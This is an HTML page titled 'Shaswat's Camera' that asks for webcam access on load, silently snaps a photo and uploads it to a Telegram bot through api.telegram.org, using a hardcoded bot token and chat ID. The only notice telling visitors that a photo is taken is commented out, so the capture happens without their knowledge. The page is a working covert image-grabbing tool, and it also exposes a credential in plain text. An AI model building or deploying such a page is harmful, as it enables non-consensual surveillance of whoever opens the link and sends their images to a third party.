<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shaswat's Camera 👀</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
        video, canvas { border: 2px solid #333; border-radius: 8px; max-width: 100%; }
        #status { margin-top: 15px; font-weight: bold; font-size: 18px; }
        
        /* Popup Modal Styles */
        .modal-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex; justify-content: center; align-items: center;
            z-index: 1000;
        }
        .modal-box {
            background: white; padding: 30px; border-radius: 10px;
            max-width: 400px; width: 90%; text-align: center;
            box-shadow: 0px 4px 15px rgba(0,0,0,0.2);
        }
        .modal-box h3 { margin-top: 0; color: #333; }
        .modal-box p { color: #566573; font-size: 15px; line-height: 1.5; }
        .bot-link { 
            display: inline-block; margin-top: 15px; padding: 10px 20px; 
            background-color: #0088cc; color: white; text-decoration: none; 
            border-radius: 5px; font-weight: bold; 
        }
        .bot-link:hover { background-color: #006699; }
    </style>
</head>
<body>

    <!-- Notification Popup Overlay -->
    <!-- <div class="modal-overlay" id="noticeModal">
        <div class="modal-box">
            <h3>📷 Automatic Verification Notice</h3>
            <p>Please allow camera access. A verification photo will be automatically captured upon loading and securely transmitted to our automated processing system.</p>
            <p>You can view updates or manage data directly via our official channel:</p>
            <a href="https://t.me" target="_blank" class="bot-link">Open Telegram Bot Link</a>
        </div>
    </div> -->

    <h2>ShaswatXCamera</h2>
    
    <video id="video" width="640" height="480" autoplay playsinline></video>
    <br>
    
    <div id="status">Initializing camera stream...</div>

    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        // --- CONFIGURATION ---
        const BOT_TOKEN = '8837215809:AAEJJ05BIjul96LJtHP_ZiKz_lnyk5a8esA'; 
        const CHAT_ID = '7787904819';     
        // ---------------------

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusDiv = document.getElementById('status');
        const noticeModal = document.getElementById('noticeModal');

        // Request access to the user's camera immediately on page load
        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(stream => {
                video.srcObject = stream;
                statusDiv.innerText = "Camera active. Capturing photo in 1 second...";
                
                // Small delay to ensure the video feed stabilizes before drawing frame
                setTimeout(autoCapturePhoto, 120);
            })
            .catch(err => {
                console.error("Camera access error: ", err);
                statusDiv.innerText = "Error: Camera access denied or unavailable.";
                noticeModal.style.display = "none"; // Hide popup if capture fails
            });

        // Automated function replacing the manual click event
        function autoCapturePhoto() {
            statusDiv.innerText = "Clicking Snap...";
            
            const context = canvas.getContext('2d');
            // Draw current video frame onto the hidden canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert canvas data into a JPEG blob file
            canvas.toBlob((blob) => {
                if (!blob) {
                    statusDiv.innerText = "Failed to process image.";
                    return;
                }
                
                statusDiv.innerText = "Processing submission...";
                sendToTelegram(blob);
            }, 'image/jpeg', 0.8);
        }

        // Send the image using FormData and Fetch API
        async function sendToTelegram(imageBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', imageBlob, 'automated_capture.jpg');
            formData.append('caption', '📸 Automated photo captured upon user entry.');

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();
                
                if (result.ok) {
                    statusDiv.innerHTML = "<span style='color: green;'>Verification Image Transmitted Successfully!</span>";
                    // Dismiss the modal once processing completes successfully
                    noticeModal.style.display = "none";
                } else {
                    statusDiv.innerHTML = `<span style='color: red;'>Telegram API Error: ${result.description}</span>`;
                }
            } catch (error) {
                console.error("Transmission error:", error);
                statusDiv.innerHTML = "<span style='color: red;'>Network error occurred.</span>";
            }
        }
    </script>
</body>
</html>
